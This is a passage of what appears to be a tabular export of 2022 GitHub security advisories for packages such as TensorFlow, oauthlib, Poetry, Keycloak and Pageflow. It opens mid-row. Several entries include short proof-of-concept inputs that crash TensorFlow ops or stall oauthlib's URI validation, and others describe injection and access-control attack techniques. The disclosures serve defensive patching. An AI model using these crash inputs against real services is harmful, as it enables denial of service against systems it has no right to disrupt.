This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.
",pip
3114,20741,tensorflow,GHSA-9j4v-pp28-mxv7,CVE-2022-36019,https://github.com/advisories/GHSA-9j4v-pp28-mxv7,moderate,2022-09-16 21:13:43 UTC,TensorFlow vulnerable to `CHECK` fail in `FakeQuantWithMinMaxVarsPerChannel`,"### Impact
If `FakeQuantWithMinMaxVarsPerChannel` is given `min` or `max` tensors of a rank other than one, it results in a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

num_bits = 8
narrow_range = False
inputs = tf.constant(0, shape=[4], dtype=tf.float32)
min = tf.constant([], shape=[4,0,0], dtype=tf.float32)
max = tf.constant(0, shape=[4], dtype=tf.float32)
tf.raw_ops.FakeQuantWithMinMaxVarsPerChannel(inputs=inputs, min=min, max=max, num_bits=num_bits, narrow_range=narrow_range)
```

### Patches
We have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.
",pip
3115,20741,tensorflow,GHSA-79h2-q768-fpxr,CVE-2022-36027,https://github.com/advisories/GHSA-79h2-q768-fpxr,moderate,2022-09-16 21:06:31 UTC,TensorFlow segfault TFLite converter on per-channel quantized transposed convolutions,"### Impact
When converting transposed convolutions using per-channel weight quantization the converter segfaults and crashes the Python process.
```python
import tensorflow as tf

class QuantConv2DTransposed(tf.keras.layers.Layer):
    def build(self, input_shape):
        self.kernel = self.add_weight(""kernel"", [3, 3, input_shape[-1], 24])

    def call(self, inputs):
        filters = tf.quantization.fake_quant_with_min_max_vars_per_channel(
            self.kernel, -3.0 * tf.ones([24]), 3.0 * tf.ones([24]), narrow_range=True
        )
        filters = tf.transpose(filters, (0, 1, 3, 2))
        return tf.nn.conv2d_transpose(inputs, filters, [*inputs.shape[:-1], 24], 1)

inp = tf.keras.Input(shape=(6, 8, 48), batch_size=1)
x = tf.quantization.fake_quant_with_min_max_vars(inp, -3.0, 3.0, narrow_range=True)
x = QuantConv2DTransposed()(x)
x = tf.quantization.fake_quant_with_min_max_vars(x, -3.0, 3.0, narrow_range=True)

model = tf.keras.Model(inp, x)

model.save(""/tmp/testing"")
converter = tf.lite.TFLiteConverter.from_saved_model(""/tmp/testing"")
converter.optimizations = [tf.lite.Optimize.DEFAULT]

# terminated by signal SIGSEGV (Address boundary error)
tflite_model = converter.convert()
```

### Patches
We have patched the issue in GitHub commit [aa0b852a4588cea4d36b74feb05d93055540b450](https://github.com/tensorflow/tensorflow/commit/aa0b852a4588cea4d36b74feb05d93055540b450).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Lukas Geiger via [Github issue](https://github.com/tensorflow/tensorflow/issues/53767).
",pip
3116,20741,tensorflow,GHSA-ffjm-4qwc-7cmf,CVE-2022-35939,https://github.com/advisories/GHSA-ffjm-4qwc-7cmf,high,2022-09-16 21:04:23 UTC,TensorFlow vulnerable to OOB write in `scatter_nd` in TF Lite,"### Impact
The [`ScatterNd`](https://github.com/tensorflow/tensorflow/blob/266558ac4c1f361e9a178ee9d3f0ce2e648ae499/tensorflow/lite/kernels/internal/reference/reference_ops.h#L659-L698) function takes an input argument that determines the indices of of the output tensor. An input index greater than the output tensor or less than zero will either write content at the wrong index or trigger a crash.

### Patches
We have patched the issue in GitHub commit [b4d4b4cb019bd7240a52daa4ba61e3cc814f0384](https://github.com/tensorflow/tensorflow/commit/b4d4b4cb019bd7240a52daa4ba61e3cc814f0384).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Hui Peng from Baidu Security.",pip
3117,20741,tensorflow,GHSA-pxrw-j2fv-hx3h,CVE-2022-35937,https://github.com/advisories/GHSA-pxrw-j2fv-hx3h,high,2022-09-16 21:04:10 UTC,TensorFlow vulnerable to OOB read in `Gather_nd` in TF Lite,"### Impact
The [`GatherNd`](https://github.com/tensorflow/tensorflow/blob/f463040eb3997e42e60a2ffc6dc72de7ef11dbb4/tensorflow/lite/kernels/gather_nd.cc#L105-L111) function takes arguments that determine the sizes of inputs and outputs. If the inputs given are greater than or equal to the sizes of the outputs, an out-of-bounds memory read is triggered.

### Patches
We have patched the issue in GitHub commit [595a65a3e224a0362d7e68c2213acfc2b499a196](https://github.com/tensorflow/tensorflow/commit/595a65a3e224a0362d7e68c2213acfc2b499a196).


The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Hui Peng from Baidu Security.
",pip
3118,20048,oauthlib,GHSA-3pgj-pg6c-r5p7,CVE-2022-36087,https://github.com/advisories/GHSA-3pgj-pg6c-r5p7,moderate,2022-09-16 21:02:52 UTC,OAuthLib vulnerable to DoS when attacker provides malicious IPV6 URI,"### Impact
- Attacker providing malicious redirect uri can cause DoS to oauthlib's web application.
- Attacker can also leverage usage of `uri_validate` functions depending where it is used.

_What kind of vulnerability is it? Who is impacted?_
Oauthlib applications using OAuth2.0 provider support or use directly `uri_validate` function.

### Patches
_Has the problem been patched? What versions should users upgrade to?_
Issue fixed in 3.2.1 release.

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_
The `redirect_uri` can be verified in web toolkit (i.e `bottle-oauthlib`, `django-oauth-toolkit`, ...) before oauthlib is called. A sample check if `:` is present to reject the request can prevent the DoS, assuming no port or IPv6 is fundamentally required.

### References
Attack Vector:
- Attacker providing malicious redirect uri:
https://github.com/oauthlib/oauthlib/blob/d4bafd9f1d0eba3766e933b1ac598cbbf37b8914/oauthlib/oauth2/rfc6749/grant_types/base.py#L232
- Vulnerable `uri_validate` functions:
https://github.com/oauthlib/oauthlib/blob/2b8a44855a51ad5a5b0c348a08c2564a2e197ea2/oauthlib/uri_validate.py

### PoC
```python
is_absolute_uri(""http://[:::::::::::::::::::::::::::::::::::::::]/path"")
```

### Acknowledgement
Special thanks to Sebastian Chnelik - PyUp.io",pip
3119,35492,com.graphql-java:graphql-java,GHSA-v62j-cxhh-fq22,CVE-2022-37734,https://github.com/advisories/GHSA-v62j-cxhh-fq22,high,2022-09-13 00:00:39 UTC,graphql-java vulnerable to Denial of Service via GraphQL query that consumes CPU resources,"graphql-java before 19.0, 18.3, and 17.4 is vulnerable to Denial of Service. An attacker send a malicious GraphQL query that consumes CPU resources. The fixed versions are 19.0, 18.3, and 17.4.",maven
3120,20741,tensorflow,GHSA-f4w6-h4f5-wx45,CVE-2022-35934,https://github.com/advisories/GHSA-f4w6-h4f5-wx45,moderate,2022-09-16 20:56:02 UTC,TensorFlow vulnerable to `CHECK` failure in tf.reshape via overflows,"### Impact
The implementation of tf.reshape op in TensorFlow is vulnerable to a denial of service via CHECK-failure (assertion failure) caused by overflowing the number of elements in a tensor:
```python
import tensorflow as tf

tf.reshape(tensor=[[1]],shape=tf.constant([0 for i in range(255)], dtype=tf.int64))
```
This is another instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (https://github.com/advisories/GHSA-prcg-wp5q-rv7p).

### Patches
We have patched the issue in GitHub commit [61f0f9b94df8c0411f0ad0ecc2fec2d3f3c33555](https://github.com/tensorflow/tensorflow/commit/61f0f9b94df8c0411f0ad0ecc2fec2d3f3c33555).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Kang Hong Jin from Singapore Management University.
",pip
3121,20741,tensorflow,GHSA-97p7-w86h-vcf9,CVE-2022-35935,https://github.com/advisories/GHSA-97p7-w86h-vcf9,moderate,2022-09-16 20:51:55 UTC,TensorFlow vulnerable to `CHECK` failure in `SobolSample` via missing validation,"### Impact
The implementation of SobolSampleOp is vulnerable to a denial of service via CHECK-failure (assertion failure) caused by assuming `input(0)`, `input(1)`, and `input(2)` to be scalar.
```python
import tensorflow as tf
tf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))
```

### Patches
We have patched the issue in GitHub commit [c65c67f88ad770662e8f191269a907bf2b94b1bf](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf).


The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by:
- Kang Hong Jin from Singapore Management University
- Neophytos Christou, Secure Systems Labs, Brown University
- 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology
",pip
3122,28888,poetry,GHSA-9xgj-fcgf-x6mw,CVE-2022-36069,https://github.com/advisories/GHSA-9xgj-fcgf-x6mw,high,2022-09-16 19:26:59 UTC,Poetry Argument Injection can lead to Local Code Execution,"### Observation

When handling dependencies that come from a Git repository instead of a registry, Poetry uses various commands, such as `git clone`. These commands are being constructed using user input (e.g. the repository URL). When building the commands, Poetry correctly avoids Command Injection vulnerabilities by passing an array of arguments instead of a command string. However, there is the possibility that a user input starts with a dash (`-`) and is therefore treated as an optional argument instead of a positional one. This can lead to Code Execution because some of the commands have options that can be leveraged to run arbitrary executables.

To clone a repository, Poetry builds a git clone command, but fails to validate or sanitize the repository location properly:

[`poetry/core/vcs/git.py`](https://github.com/python-poetry/poetry-core/blob/ad33bc2f92be03dc5b31a666664903c439fb1173/poetry/core/vcs/git.py#L207):

```python
def clone(self, repository: str, dest: Path) -> str:
    return self.run(""clone"", ""--recurse-submodules"", repository, str(dest))
```

Since this value comes from the `pyproject.toml` file, it can contain any character, including a leading dash.

### Impact

This vulnerability can lead to Arbitrary Code Execution, which would lead to the takeover of the system. If a developer is exploited, the attacker could steal credentials or persist their access. If the exploit happens on a server, the attackers could use their access to attack other internal systems.
Since this vulnerability requires a fair amount of user interaction, it is not as dangerous as a remotely exploitable one. However, it still puts developers at risk when dealing with untrusted files in a way they think is safe, because the exploit still works when the victim tries to make sure nothing can happen, e.g. by vetting any Git or Poetry config files that might be present in the directory.
This kind of attack vector has been used in the past to target security researchers by sending them projects to collaborate on, so we believe that there is a non-negligible risk.

### Patches

1.1.8 || 1.2.0b1

### Remediation

Upgrade to version 1.1.9 || 1.2.0b1

### References

[Fix PR](https://github.com/python-poetry/poetry-core/pull/202)

### For more information
If you have any questions or comments about this advisory, email us at [security@python-poetry.org](mailto:security@python-poetry.org)
",pip
3123,20741,tensorflow,GHSA-p7hr-f446-x6qf,CVE-2022-35997,https://github.com/advisories/GHSA-p7hr-f446-x6qf,moderate,2022-09-16 19:25:36 UTC,TensorFlow vulnerable to `CHECK` fail in `tf.sparse.cross`,"### Impact
If `tf.sparse.cross` receives an input `separator` that is not a scalar, it gives a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

tf.sparse.cross(inputs=[],name='a',separator=tf.constant(['a', 'b'],dtype=tf.string))
```

### Patches
We have patched the issue in GitHub commit [83dcb4dbfa094e33db084e97c4d0531a559e0ebf](https://github.com/tensorflow/tensorflow/commit/83dcb4dbfa094e33db084e97c4d0531a559e0ebf).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Kang Hong Jin.
",pip
3124,20741,tensorflow,GHSA-37jf-mjv6-xfqw,CVE-2022-35999,https://github.com/advisories/GHSA-37jf-mjv6-xfqw,moderate,2022-09-16 19:24:49 UTC,TensorFlow vulnerable to `CHECK` fail in `Conv2DBackpropInput`,"### Impact
When `Conv2DBackpropInput` receives empty `out_backprop` inputs (e.g. `[3, 1, 0, 1]`), the current CPU/GPU kernels `CHECK` fail (one with dnnl, the other with cudnn). This can be used to trigger a denial of service attack.
```python
import tensorflow as tf
import numpy as np
input_sizes = [3, 1, 1, 2]
filter = np.ones([1, 3, 2, 3])
out_backprop = np.ones([3, 1, 0, 3])
strides = [1, 1, 2, 1]
padding = 'VALID'

tf.raw_ops.Conv2DBackpropInput(
   input_sizes = input_sizes,
   filter = filter,
   out_backprop = out_backprop,
   strides = strides,
   padding = padding
)
```

### Patches
We have patched the issue in GitHub commit [27a65a43cf763897fecfa5cdb5cc653fc5dd0346](https://github.com/tensorflow/tensorflow/commit/27a65a43cf763897fecfa5cdb5cc653fc5dd0346).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Jingyi Shi.
",pip
3125,36769,org.zkoss.zk:zk,GHSA-6278-2q4m-cmf3,CVE-2022-36537,https://github.com/advisories/GHSA-6278-2q4m-cmf3,high,2022-08-27 00:00:43 UTC,ZK Framework vulnerable to malicious POST,"ZK Framework version 9.6.1, 9.6.0.1, 9.5.1.3, 9.0.1.2 and 8.6.4.1 allows attackers to access sensitive information via a crafted POST request sent to the component AuUploader.",maven
3126,35825,org.keycloak:keycloak-core,GHSA-w8v7-c7pm-7wfr,,https://github.com/advisories/GHSA-w8v7-c7pm-7wfr,moderate,2022-09-02 00:01:02 UTC,Duplicate Advisory: Keycloak vulnerable to Cross-Site Scripting (XSS),"## Duplicate Advisory
This advisory is a duplicate of [GHSA-w9mf-83w3-fv49](https://github.com/advisories/GHSA-w9mf-83w3-fv49). This link is maintained to preserve external references.

## Original Description
A stored Cross-site scripting (XSS) vulnerability was found in keycloak as shipped in Red Hat Single Sign-On 7. This flaw allows a privileged attacker to execute malicious scripts in the admin console, abusing the default roles functionality.",maven
3127,35825,org.keycloak:keycloak-core,GHSA-j9xq-j329-2xvg,CVE-2021-3754,https://github.com/advisories/GHSA-j9xq-j329-2xvg,moderate,2022-08-27 00:00:45 UTC,Keycloak user may register themselves with same email ID of any existing user,A flaw was found in keycloak where an attacker is able to register himself with the username same as the email ID of any existing user. This may cause trouble in getting password recovery email in case the user forgets the password.,maven
3128,34007,org.yaml:snakeyaml,GHSA-98wm-3w3q-mw94,CVE-2022-38751,https://github.com/advisories/GHSA-98wm-3w3q-mw94,moderate,2022-09-06 00:00:27 UTC,snakeYAML before 1.31 vulnerable to Denial of Service due to Out-of-bounds Write,"Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.",maven
3129,20810,apache-airflow,GHSA-q8h9-pqcx-59hw,CVE-2022-38170,https://github.com/advisories/GHSA-q8h9-pqcx-59hw,moderate,2022-09-03 00:00:25 UTC,Apache Airflow exposes arbitrary file content,"In Apache Airflow prior to 2.3.4, an insecure umask was configured for numerous Airflow components when running with the `--daemon` flag which could result in a race condition giving world-writable files in the Airflow home directory and allowing local users to expose arbitrary file contents via the webserver.",pip
3130,17801,expo,GHSA-rwx9-wqj8-vr77,CVE-2020-24653,https://github.com/advisories/GHSA-rwx9-wqj8-vr77,moderate,2022-05-24 17:26:43 UTC,Expo on iOS is insecure due incorrect security attribute application,secure-store in Expo through 9.1.0 on iOS provides the insecure kSecAttrAccessibleAlwaysThisDeviceOnly policy when WHEN_UNLOCKED_THIS_DEVICE_ONLY is used.,npm
3131,20810,apache-airflow,GHSA-5ff8-7639-6v6g,CVE-2022-38054,https://github.com/advisories/GHSA-5ff8-7639-6v6g,critical,2022-09-03 00:00:25 UTC,Apache Airflow Session Fixation vulnerability,"In Apache Airflow versions 2.2.4 through 2.3.3, the `database` webserver session backend was susceptible to session fixation.",pip
3132,34007,org.yaml:snakeyaml,GHSA-c4r9-r8fh-9vj2,CVE-2022-38749,https://github.com/advisories/GHSA-c4r9-r8fh-9vj2,moderate,2022-09-06 00:00:27 UTC,snakeYAML before 1.31 vulnerable to Denial of Service due to Out-of-bounds Write,"Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.",maven
3133,27053,pageflow,GHSA-qcqv-38jg-2r43,,https://github.com/advisories/GHSA-qcqv-38jg-2r43,high,2022-09-15 03:21:41 UTC,Pageflow vulnerable to insecure direct object reference in membership update endpoint,"### Impact

Pageflow has a membership edit feature which allows users to edit the roles of user memberships associated with an account that they have the `manager` role to (including their own). While the `Entity` dropdown select field is greyed out in the UI, an attacker can use tools which allow sending arbitrary HTTP request to craft a request to the `/admin/users/{user_id}/memberships/{membership_id}` endpoint containing an additional `membership[entity_id]` parameter. This parameter is honored when the membership is updated, allowing an attacker to update the membership object associated with their own account (with `manager` role) to be associated with a different attacker-chosen account instead. Since `account_id`s are enumerable, an attacker can compromise all accounts present on the platform.

### Mitigation

Upgrade to version 15.7.1 or 14.5.2 of the `pageflow` gem.

### For more information

If you have any questions or comments about this advisory email us at info(at)codevise.de 

### Credits

[Positive Security](https://positive.security/)",rubygems
3134,27053,pageflow,GHSA-wrrw-crp8-979q,,https://github.com/advisories/GHSA-wrrw-crp8-979q,high,2022-09-15 03:21:00 UTC,Pageflow vulnerable to sensitive user data extraction via Ransack query injection,"### Impact

The attack allows extracting sensitive properties of database objects that are associated with users or entries belonging to an account that the attacker has access to.

Pageflow uses the `ActiveAdmin` Ruby library to provide some management features to its users. `ActiveAdmin` relies on the `Ransack` library to implement search functionality. In its default configuration, `Ransack` will allow for query conditions based on properties of associated database objects [1]. The `*_starts_with`, `*_ends_with` or `*_contains` search matchers [2] can then be abused to exfiltrate sensitive string values of associated database objects via character-by-character brute-force.

[1] https://activerecord-hackery.github.io/ransack/going-further/associations/
[2] https://activerecord-hackery.github.io/ransack/getting-started/search-matches/

### Mitigation

Upgrade to version 15.7.1 or 14.5.2 of the `pageflow` gem.

### For more information

If you have any questions or comments about this advisory email us at info(at)codevise.de 

### Credits

[Positive Security](https://positive.security/)


",rubygems
3135,34007,org.yaml:snakeyaml,GHSA-9w3m-gqgf-c4p9,CVE-2022-38752,https://github.com/advisories/GHSA-9w3m-gqgf-c4p9,moderate,2022-09-06 00:00:27 UTC,snakeYAML before 1.32 vulnerable to Denial of Service due to Out-of-bounds Write,"Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DoS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stack-overflow.",maven
3136,18823,nokogiri,GHSA-6wj9-77wq-jq7p,CVE-2012-6685,https://github.com/advisories/GHSA-6wj9-77wq-jq7p,moderate,2022-04-23 00:40:45 UTC,Nokogiri is vulnerable to XML External Entity (XXE) attack,Nokogiri before 1.5.4 is vulnerable to XXE attacks.,rubygems
3137,35825,org.keycloak:keycloak-core,GHSA-cf8f-w2c5-p5jr,CVE-2019-14837,https://github.com/advisories/GHSA-cf8f-w2c5-p5jr,moderate,2022-05-24 17:05:43 UTC,keycloak vulnerable to unauthorized login via mail server setup,"A flaw was found in keycloack before version 8.0.0. The owner of 'placeholder.org' domain can setup mail server on this domain and knowing only name of a client can reset password and then log in. For example, for client name 'test' the email address will be 'service-account-test@placeholder.org'.",maven
3138,15892,jquery,GHSA-579v-mp3v-rrw5,CVE-2011-4969,https://github.com/advisories/GHSA-579v-mp3v-rrw5,moderate,2022-05-14 01:09:51 UTC,jQuery vulnerable to Cross-Site Scripting (XSS),"Cross-site scripting (XSS) vulnerability in jQuery before 1.6.3, when using location.hash to select elements, allows remote attackers to inject arbitrary web script or HTML via a crafted tag.",npm
3139,34007,org.yaml:snakeyaml,GHSA-3mc7-4q67-w48m,CVE-2022-25857,https://github.com/advisories/GHSA-3mc7-4q67-w48m,high,2022-08-31 00:00:24 UTC,Uncontrolled Resource Consumption in snakeyaml,The package org.yaml:snakeyaml from 0 and before 1.31 are vulnerable to Denial of Service (DoS) due missing to nested depth limitation for collections.,maven
3140,20077,mistune,GHSA-hpv5-v8g5-c864,CVE-2017-15612,https://github.com/advisories/GHSA-hpv5-v8g5-c864,moderate,2022-05-17 00:26:00 UTC,Cross-site Scripting in Mistune,"mistune.py in Mistune 0.7.4 allows XSS via an unexpected newline (such as in java\nscript:) or a crafted email address, related to the escape and autolink functions.",pip
3141,34022,org.postgresql:postgresql,GHSA-727h-hrw8-jg8q,CVE-2022-26520,https://github.com/advisories/GHSA-727h-hrw8-jg8q,low,2022-03-11 00:02:02 UTC,Path traversal in org.postgresql:postgresql,"** DISPUTED ** In pgjdbc before 42.3.3, an attacker (who controls the jdbc URL or properties) can call java.util.logging.FileHandler to write to arbitrary files through the loggerFile and loggerLevel connection properties. An example situation is that an attacker could create an executable JSP file under a Tomcat web root. NOTE: the vendor's position is that there is no pgjdbc vulnerability; instead, it is a vulnerability for any application to use the pgjdbc driver with untrusted connection properties.",maven
3142,34833,commons-jxpath:commons-jxpath,GHSA-c7mc-q43h-5672,CVE-2022-40157,https://github.com/advisories/GHSA-c7mc-q43h-5672,moderate,2022-10-06 18:52:04 UTC,JXPath Out-of-bounds Write vulnerability,"Those using JXPath to interpret XPath may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.",maven
3143,19962,py,GHSA-w596-4wvx-j9j6,CVE-2022-42969,https://github.com/advisories/GHSA-w596-4wvx-j9j6,moderate,2022-10-16 12:00:23 UTC,ReDoS in py library when used with subversion,"The py library through 1.11.0 for Python allows remote attackers to conduct a ReDoS (Regular expression Denial of Service) attack via a Subversion repository with crafted info data, because the InfoSvnCommand argument is mishandled.

The particular codepath in question is the regular expression at `py._path.svnurl.InfoSvnCommand.lspattern` and is only relevant when dealing with subversion (svn) projects. Notablely the codepath is not used in the popular pytest project.",pip
3144,18823,nokogiri,GHSA-2qc6-mcvw-92cw,,https://github.com/advisories/GHSA-2qc6-mcvw-92cw,moderate,2022-10-18 18:12:31 UTC,Update bundled libxml2 to v2.10.3 to resolve multiple CVEs,"### Summary

Nokogiri v1.13.9 upgrades the packaged version of its dependency libxml2 to [v2.10.3](https://gitlab.gnome.org/GNOME/libxml2/-/releases/v2.10.3) from v2.9.14.

libxml2 v2.10.3 addresses the following known vulnerabilities:

- [CVE-2022-2309](https://nvd.nist.gov/vuln/detail/CVE-2022-2309)
- [CVE-2022-40304](https://nvd.nist.gov/vuln/detail/CVE-2022-40304)
- [CVE-2022-40303](https://nvd.nist.gov/vuln/detail/CVE-2022-40303)

Please note that this advisory only applies to the CRuby implementation of Nokogiri `< 1.13.9`, and only if the _packaged_ libraries are being used. If you've overridden defaults at installation time to use _system_ libraries instead of packaged libraries, you should instead pay attention to your distro's `libxml2` release announcements.


### Mitigation

Upgrade to Nokogiri `>= 1.13.9`.

Users who are unable to upgrade Nokogiri may also choose a more complicated mitigation: compile and link Nokogiri against external libraries libxml2 `>= 2.10.3` which will also address these same issues.


### Impact

#### libxml2 [CVE-2022-2309](https://nvd.nist.gov/vuln/detail/CVE-2022-2309)

- **CVSS3 score**: Under evaluation
- **Type**: Denial of service
- **Description**: NULL Pointer Dereference allows attackers to cause a denial of service (or application crash). This only applies when lxml is used together with libxml2 2.9.10 through 2.9.14. libxml2 2.9.9 and earlier are not affected. It allows triggering crashes through forged input data, given a vulnerable code sequence in the application. The vulnerability is caused by the iterwalk function (also used by the canonicalize function). Such code shouldn't be in wide-spread use, given that parsing + iterwalk would usually be replaced with the more efficient iterparse function. However, an XML converter that serialises to C14N would also be vulnerable, for example, and there are legitimate use cases for this code sequence. If untrusted input is received (also remotely) and processed via iterwalk function, a crash can be triggered.

Nokogiri maintainers investigated at #2620 and determined this CVE does not affect Nokogiri users.


#### libxml2 [CVE-2022-40304](https://nvd.nist.gov/vuln/detail/CVE-2022-40304)

- **CVSS3 score**: Unspecified upstream
- **Type**: Data corruption, denial of service
- **Description**: When an entity reference cycle is detected, the entity content is cleared by setting its first byte to zero. But the entity content might be allocated from a dict. In this case, the dict entry becomes corrupted leading to all kinds of logic errors, including memory errors like double-frees.

See https://gitlab.gnome.org/GNOME/libxml2/-/commit/644a89e080bced793295f61f18aac8cfad6bece2


#### libxml2 [CVE-2022-40303](https://nvd.nist.gov/vuln/detail/CVE-2022-40303)

- **CVSS3 score**: Unspecified upstream
- **Type**: Integer overflow
- **Description**: Integer overflows with XML_PARSE_HUGE

See https://gitlab.gnome.org/GNOME/libxml2/-/commit/c846986356fc149915a74972bf198abc266bc2c0


### References

- [libxml2 release notes](https://gitlab.gnome.org/GNOME/libxml2/-/releases)
- [CVE-2022-2309](https://nvd.nist.gov/vuln/detail/CVE-2022-2309)
- [CVE-2022-40304](https://nvd.nist.gov/vuln/detail/CVE-2022-40304)
- [CVE-2022-40303](https://nvd.nist.gov/vuln/detail/CVE-2022-40303)
",rubygems
3145,35509,org.ini4j:ini4j,GHSA-jr6h-r7vg-f9mc,CVE-2022-41404,https://github.com/advisories/GHSA-jr6h-r7vg-f9mc,high,2022-10-12 12:00:20 UTC,org.ini4j allows attackers to cause a Denial of Service (DoS),An issue in the fetch() method in the BasicProfile class of org.ini4j before v0.5.4 allows attackers to cause a Denial of Service (DoS) via unspecified vectors.,maven